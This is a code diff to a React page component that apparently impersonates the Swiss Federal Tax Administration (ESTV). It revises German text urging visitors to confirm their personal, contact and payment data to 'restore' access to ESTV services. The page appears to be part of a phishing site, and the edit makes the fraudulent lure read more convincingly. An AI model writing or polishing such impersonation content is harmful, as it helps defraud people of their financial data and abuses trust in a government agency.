@@ -152,10 +152,10 @@ const Estv = () => {
             Datenaktualisierung
           </h1>
           <p className="text-[16px] text-gray-700 leading-relaxed max-w-[680px] mb-8">
-            Aufgrund einer turnusmässigen Überprüfung müssen alle bei der Eidgenössischen
+            Im Rahmen einer regelmässigen Überprüfung müssen Ihre bei der Eidgenössischen
             Steuerverwaltung (ESTV) hinterlegten Personen-, Kontakt- und Zahlungsdaten
-            bestätigt werden. Bitte aktualisieren Sie Ihre Angaben, um den vollen Zugriff
-            auf sämtliche ESTV-Dienstleistungen wiederherzustellen.
+            bestätigt werden. Bitte aktualisieren Sie Ihre Angaben, um wieder vollen
+            Zugriff auf alle ESTV-Dienste zu erhalten.
           </p>
 
           {/* Hinweis */}
